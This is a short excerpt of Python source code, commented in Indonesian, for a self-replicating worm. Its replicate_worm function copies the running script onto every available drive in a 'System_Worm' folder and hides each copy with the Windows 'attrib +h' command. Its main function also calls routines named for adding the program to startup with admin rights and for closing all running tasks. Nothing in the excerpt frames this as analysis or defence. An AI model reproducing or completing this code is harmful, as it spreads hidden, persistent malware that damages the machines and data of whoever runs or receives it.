...
import shutil  # Untuk fungsi worm
...
def replicate_worm():
    """
    Fungsi untuk mereplikasi program ke semua lokasi drive yang tersedia.
    """
    script_path = os.path.abspath(sys.argv[0])  # Lokasi skrip saat ini
    drives = get_all_drives()

    for drive in drives:
        worm_dir = os.path.join(drive, "System_Worm")
        if not os.path.exists(worm_dir):
            os.makedirs(worm_dir)

        worm_path = os.path.join(worm_dir, os.path.basename(script_path))
        try:
            shutil.copy2(script_path, worm_path)
            # Menambahkan file ke startup untuk setiap lokasi
            if platform.system() == "Windows":
                subprocess.run(['attrib', '+h', worm_path])  # Menyembunyikan file
        except Exception as e:
            print(f"Error replicating worm: {e}")

def main():
    add_to_startup_and_admin()
    close_all_tasks()
    replicate_worm()  # Replikasi worm
